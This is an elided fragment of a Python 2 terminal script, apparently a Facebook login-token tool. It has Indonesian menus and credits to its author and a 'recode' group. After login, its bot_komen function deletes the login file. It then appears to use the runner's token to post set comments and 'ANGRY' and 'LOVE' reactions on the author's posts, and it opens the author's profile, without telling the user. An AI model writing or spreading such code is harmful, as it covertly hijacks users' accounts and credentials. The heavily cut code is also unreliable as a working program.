...
try:
	...
	os.system("python2 sholeh-04.py")
...
┃┗━┛┃┃╋┃┃┗━┛┃┗━┛┃┗━━┫┃╋┃┃┏┫┣┳┛┗┛┃
┗━━━┻┛╋┗┻━━━┻━━━┻━━━┻┛╋┗┛┗━━┻━━━┛
\033[1;96mAuthor   : MUHAMMAD SHOLEHUDDIN
\033[1;96mRecode   : MEGA BINTANG UNIKERS INDONESIA
\033[1;96mFacebook : https://www.facebook.com/morena.sumba
"""
...
def pilih_masuk():
	msuk = raw_input("\033[1;93mMR SHOLEH \033[91m:\033[1;96m ")
	if msuk =="":
...
def tokenz():
	...
	try:
		...
		os.system('xdg-open https://www.facebook.com/morena.sumba ')
		bot_komen()
	except KeyError:
...
def bot_komen():
	try:
		...
		os.system('rm -rf login.txt')
	una = ('100004254376539')
	kom = ('GUE PAKE SCRIPT LU YA SHOLEH 😘😘😘')
	reac = ('ANGRY')
	post = ('1809878189163976')
	post2 = ('1809883242496804')
	kom2 = ('KEREN SUKSES SELALU YA 😘😘😘')
	reac2 = ('LOVE')
...
######PILIH######
def pilih():
	unikers = raw_input("\033[1;93mMR SHOLEH \033[91m:\033[1;96m ")
	if unikers =="":
...
#### PILIH INDO ####
def pilih_indo():
	teak = raw_input("\033[1;93mMR SHOLEH \033[91m:\033[1;96m ")
	if teak =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih_indo()
	...
	print "\n\033[1;31;1m=========================================="
        ...
        print "\n\033[1;33mBY MUHAMMAD SHOLEHUDDIN"
	print "\n\033[37;1m=========================================="
